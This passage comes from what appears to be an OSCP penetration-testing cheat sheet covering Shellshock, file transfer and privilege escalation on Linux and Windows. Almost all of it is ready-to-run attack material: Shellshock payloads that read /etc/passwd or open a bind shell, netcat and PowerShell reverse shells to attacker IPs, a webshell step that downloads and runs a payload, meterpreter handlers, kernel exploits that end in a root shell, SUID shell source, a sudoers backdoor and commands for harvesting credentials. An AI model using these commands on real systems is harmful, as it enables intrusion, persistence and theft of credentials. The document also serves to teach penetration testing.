echo -e "HEAD /cgi-bin/status HTTP/1.1\\\\r\\\\nUser-Agent: () {:;}; echo \\\\$(</etc/passwd)\\\\r\\\\nHost:vulnerable\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n" | nc TARGET 80

    - Shell Shock run bind shell\
echo -e "HEAD /cgi-bin/status HTTP/1.1\\\\r\\\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\\\r\\\\nHost:vulnerable\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n" | nc TARGET 80

# File Transfers

- Post exploitation refers to the actions performed by an attacker, once some level of control has been gained on his target.

- Simple Local Web Servers

    - Run a basic http server, great for serving up shells etc python -m SimpleHTTPServer 80

    - Run a basic Python3 http server, great for serving up shells etc python3 -m http.server

    - Run a ruby webrick basic http server ruby -rwebrick -e “WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start”

    - Run a basic PHP http server php -S $ip:80

- Creating a wget VB Script on Windows:[*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt) 

- Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):\
echo Set args = Wscript.Arguments >> webdl.vbs\
timeout 1\
echo Url = "<[http://1.1.1.1/windows-privesc-check2.exe](http://1.1.1.1/windows-privesc-check2.exe)>" >> webdl.vbs\
timeout 1\
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> webdl.vbs\
timeout 1\
echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> webdl.vbs\
timeout 1\
echo xHttp.Open "GET", Url, False >> webdl.vbs\
timeout 1\
echo xHttp.Send >> webdl.vbs\
timeout 1\
echo with bStrm >> webdl.vbs\
timeout 1\
echo .type = 1 ' >> webdl.vbs\
timeout 1\
echo .open >> webdl.vbs\
timeout 1\
echo .write xHttp.responseBody >> webdl.vbs\
timeout 1\
echo .savetofile "C:\\temp\\windows-privesc-check2.exe", 2 ' >> webdl.vbs\
timeout 1\
echo end with >> webdl.vbs\
timeout 1\
echo\
The file can be run using the following syntax:\
C:\\temp\\cscript.exe webdl.vbs

- Mounting File Shares

    - Mount NFS share to /mnt/nfs mount $ip:/vol/share /mnt/nfs

- HTTP Put nmap -p80 $ip –script http-put –script-args http-put.url=‘/test/sicpwn.php’,http-put.file=’/var/www/html/sicpwn.php

- Uploading Files

    - SCP\
scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2\
scp localfile username@$ip:~/Folder/~\
~scp Linux_Exploit_Suggester.pl~ [~bob@192.168.1.10~](mailto:bob@192.168.1.10)~:~

    - Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor\
davtest -move -sendbd auto -url <http://$ip>\
[https://github.com/cldrn/davtest](https://github.com/cldrn/davtest)\
You can also upload a file using the PUT method with the curl command:\
curl -T 'leetshellz.txt' '<http://$ip>'\
And rename it to an executable file using the MOVE method with the curl command:\
curl -X MOVE --header 'Destination:<http://$ip/leetshellz.php>' '<http://$ip/leetshellz.txt'>

    - Upload shell using limited php shell cmd use the webshell to download and execute the meterpreter \[curl -s –data “cmd=wget [http://174.0.42.42:8000/dhn](http://174.0.42.42:8000/dhn) -O /tmp/evil” [http://$ip/files/sh.php](http://$ip/files/sh.php) \[curl -s --data "cmd=chmod 777 /tmp/evil" [http://$ip/files/sh.php](http://$ip/files/sh.php) curl -s –data “cmd=bash -c /tmp/evil” [http://$ip/files/sh.php](http://$ip/files/sh.php) 

    - TFTP mkdir /tftp atftpd –daemon –port 69 /tftp cp /usr/share/windows-binaries/nc.exe /tftp/ EX. FROM WINDOWS HOST: C:>tftp -i $ip get nc.exe

    - FTP apt-get update && apt-get install pure-ftpd\
\#!/bin/bash groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd offsec -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/\
/etc/init.d/pure-ftpd restart

- Packing Files

    - Ultimate Packer for eXecutables upx -9 nc.exe

    - exe2bat - Converts EXE to a text file that can be copied and pasted locate exe2bat wine exe2bat.exe nc.exe nc.txt

    - Veil - Evasion Framework - [https://github.com/Veil-Framework/Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion) apt-get -y install git git clone [https://github.com/Veil-Framework/Veil-Evasion.git](https://github.com/Veil-Framework/Veil-Evasion.git) cd Veil-Evasion/ cd setup [setup.sh](http://setup.sh/) -c

# Privilege Escalation

*Password reuse is your friend. The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*

- Defacto Linux Privilege Escalation Guide - A much more through guide for linux enumeration:[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 

- Try the obvious - Maybe the user is root or can sudo to root:\
id\
sudo su

- Here are the commands I have learned to use to perform linux enumeration and privledge escalation:\
What users can login to this box (Do they use thier username as thier password)?:\
grep -vE "nologin|false" /etc/passwd\
What kernel version are we using? Do we have any kernel exploits for this version?\
uname -a\
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"\
What applications have active connections?:\
netstat -tulpn\
What services are running as root?:\
ps aux | grep root\
What files run as root / SUID / GUID?:\
find / -perm +2000 -user root -type f -print\
find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.\
find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.\
find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.\
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID\
for i in `locate -r "bin$"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null; done\
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null\
What folders are world writeable?:\
find / -writable -type d 2>/dev/null # world-writeable folders\
find / -perm -222 -type d 2>/dev/null # world-writeable folders\
find / -perm -o w -type d 2>/dev/null # world-writeable folders\
find / -perm -o x -type d 2>/dev/null # world-executable folders\
find / \\( -perm -o w -perm -o x \\) -type d 2>/dev/null # world-writeable & executable folders

- There are a few scripts that can automate the linux enumeration process:

    - Google is my favorite Linux Kernel exploitation search tool. Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.

    - [LinuxPrivChecker.py](http://linuxprivchecker.py/) - My favorite automated linux priv enumeration checker -\
[https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py) 

    - LinEnum - (Recently Updated)\
[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) 

    - linux-exploit-suggester (Recently Updated)\
[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) 

    - Highon.coffee Linux Local Enum - Great enumeration script!\
wget <[https://highon.coffee/downloads/linux-local-enum.sh](https://highon.coffee/downloads/linux-local-enum.sh)>

    - Linux Privilege Exploit Suggester (Old has not been updated in years)\
[https://github.com/PenturaLabs/Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester) 

    - Linux post exploitation enumeration and exploit checking tools\
[https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)\
Handy Kernel Exploits

- CVE-2010-2959 - ‘CAN BCM’ Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)\
[https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)\
wget -O i-can-haz-modharden.c <[http://www.exploit-db.com/download/14814](http://www.exploit-db.com/download/14814)>\
$ gcc i-can-haz-modharden.c -o i-can-haz-modharden\
$ ./i-can-haz-modharden\
\[+\] launching root shell!\
\# id\
uid=0(root) gid=0(root)

- CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8[https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/) 

- CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)[https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/) Linux CVE 2012-0056\
wget -O exploit.c <[http://www.exploit-db.com/download/18411](http://www.exploit-db.com/download/18411)>\
gcc -o mempodipper exploit.c\
./mempodipper

- CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8[https://dirtycow.ninja/](https://dirtycow.ninja/) First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

- Run a command as a user other than root\
sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf

- Add a user or change a password\
/usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor\
echo thePassword | passwd haxzor --stdin

- Local Privilege Escalation Exploit in Linux

    - **SUID** (**S**et owner **U**ser **ID** up on execution) Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.\
below are some quick copy and paste examples for various shells:\
SUID C Shell for /bin/bash

int main(void){\
setresuid(0, 0, 0);\
system("/bin/bash");\
}

SUID C Shell for /bin/sh

int main(void){\
setresuid(0, 0, 0);\
system("/bin/sh");\
}

Building the SUID Shell binary\
gcc -o suid suid.c\
For 32 bit:\
gcc -m32 -o suid suid.c

- Create and compile an SUID from a limited shell (no file transfer)\
echo "int main(void){\\nsetgid(0);\\nsetuid(0);\\nsystem(\\"/bin/sh\\");\\n}" >privsc.c\
gcc privsc.c -o privsc

- Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:\
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.\
set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"\
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh\
chmod +x ssh

- SearchSploit\
searchsploit –uncsearchsploit apache 2.2\
searchsploit "Linux Kernel"\
searchsploit linux 2.6 | grep -i ubuntu | grep local\
searchsploit slmail

- Kernel Exploit Suggestions for Kernel Version 3.0.0\
./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0

- Precompiled Linux Kernel Exploits - ***Super handy if GCC is not installed on the target machine!***\
 [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/) 

- Collect root password\
cat /etc/shadow |grep root

- Find and display the proof.txt or flag.txt - LOOT!\
cat `find / -name proof.txt -print`

- Windows Privilege Escalation resource [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html) 

- Metasploit Meterpreter Privilege Escalation Guide [https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/) 

- Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:\
whoami\
net user "%username%"

- Try the getsystem command using meterpreter - rarely works but is worth a try.\
meterpreter > getsystem

- No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).\
Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:\
@echo --------- BASIC WINDOWS RECON --------- > report.txt\
timeout 1\
net config Workstation >> report.txt\
timeout 1\
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt\
timeout 1\
hostname >> report.txt\
timeout 1\
net users >> report.txt\
timeout 1\
ipconfig /all >> report.txt\
timeout 1\
route print >> report.txt\
timeout 1\
arp -A >> report.txt\
timeout 1\
netstat -ano >> report.txt\
timeout 1\
netsh firewall show state >> report.txt\
timeout 1\
netsh firewall show config >> report.txt\
timeout 1\
schtasks /query /fo LIST /v >> report.txt\
timeout 1\
tasklist /SVC >> report.txt\
timeout 1\
net start >> report.txt\
timeout 1\
DRIVERQUERY >> report.txt\
timeout 1\
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated >> report.txt\
timeout 1\
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated >> report.txt\
timeout 1\
dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\* >> report.txt\
timeout 1\
findstr /si password \*.xml \*.ini \*.txt >> report.txt\
timeout 1\
reg query HKLM /f password /t REG_SZ /s >> report.txt\
timeout 1\
reg query HKCU /f password /t REG_SZ /s >> report.txt\
timeout 1\
dir "C:\\"\
timeout 1\
dir "C:\\Program Files\\" >> report.txt\
timeout 1\
dir "C:\\Program Files (x86)\\"\
timeout 1\
dir "C:\\Users\\"\
timeout 1\
dir "C:\\Users\\Public\\"\
timeout 1\
echo REPORT COMPLETE!

- Windows Server 2003 and IIS 6.0 WEBDAV Exploiting [http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html](http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html)\
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

cadavar <http://$ip>\
dav:/> put aspshell.txt\
Uploading aspshell.txt to `/aspshell.txt':
Progress: \[=============================\\>\] 100.0% of 38468 bytes succeeded.
dav:/\\> copy aspshell.txt aspshell3.asp;.txt
Copying `/aspshell3.txt' to \`/aspshell3.asp%3b.txt': succeeded.\
dav:/> exit

msf > use exploit/multi/handler\
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp\
msf exploit(handler) > set LHOST 1.2.3.4\
msf exploit(handler) > set LPORT 80\
msf exploit(handler) > set ExitOnSession false\
msf exploit(handler) > exploit -j

curl <http://$ip/aspshell3.asp;.txt>

\[\*\] Started reverse TCP handler on 1.2.3.4:443\
\[\*\] Starting the payload handler...\
\[\*\] Sending stage (957487 bytes) to 1.2.3.5\
\[\*\] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

- Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using [pyinstaller.py](http://pyinstaller.py/) into an executable and upload them to the remote server.\
pip install pyinstaller\
wget -O exploit.py <[http://www.exploit-db.com/download/31853](http://www.exploit-db.com/download/31853)>\
python pyinstaller.py --onefile exploit.py

- Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:\
[https://www.exploit-db.com/exploits/6705/](https://www.exploit-db.com/exploits/6705/)\
[https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)\
c:\\Inetpub>churrasco\
churrasco\
/churrasco/-->Usage: Churrasco.exe \[-d\] "command to run"

c:\\Inetpub>churrasco -d "net user /add <username> <password>"\
c:\\Inetpub>churrasco -d "net localgroup administrators <username> /add"\
c:\\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

- Windows MS11-080 - [http://www.exploit-db.com/exploits/18176/](http://www.exploit-db.com/exploits/18176/)\
python pyinstaller.py --onefile ms11-080.py\
mx11-080.exe -O XP

- Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt. Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:\
MS16-032 [https://www.exploit-db.com/exploits/39719/](https://www.exploit-db.com/exploits/39719/)\
powershell -ExecutionPolicy ByPass -command "& { . C:\\Users\\Public\\Invoke-MS16-032.ps1; Invoke-MS16-032 }"

- Powershell Priv Escalation Tools [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) 

- Windows Run As - Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.

    - Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).\
C:\\>psexec64 \\\\COMPUTERNAME -u Test -p test -h "c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"

PsExec v2.2 - Execute processes remotely\
Copyright (C) 2001-2016 Mark Russinovich\
Sysinternals - [www.sysinternals.com](http://www.sysinternals.com/) 

- Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:\
C:\\>C:\\Windows\\System32\\runas.exe /env /noprofile /user:Test "c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"\
Enter the password for Test:\
Attempting to start nc.exe as user "COMPUTERNAME\\Test" ...

- PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.\
$username = '<username here>'\
$password = '<password here>'\
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword\
Start-Process -FilePath C:\\Users\\Public\\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\\Users\\Public\
Next run this script using powershell.exe:\
powershell -ExecutionPolicy ByPass -command "& { . C:\\Users\\public\\PowerShellRunAs.ps1; }"

- Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user. icacls scsiaccess.exe\
scsiaccess.exe\
NT AUTHORITY\\SYSTEM:(I)(F)\
BUILTIN\\Administrators:(I)(F)\
BUILTIN\\Users:(I)(RX)\
APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\
Everyone:(I)(F)

- Compile a custom add user command in windows using C\
root@kali:\~# cat useradd.c\
\#include <stdlib.h> /\* system, NULL, EXIT_FAILURE \*/\
int main ()\
{\
int i;\
i=system ("net localgroup administrators low /add");\
return 0;\
}\
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

- Group Policy Preferences (GPP) A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files

    - map the Domain controller SYSVOL share\
net use z:\\\\dc01\\SYSVOL

    - Find the GPP file: Groups.xml\
dir /s Groups.xml

    - Review the contents for passwords\
type Groups.xml

    - Decrypt using GPP Decrypt\
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB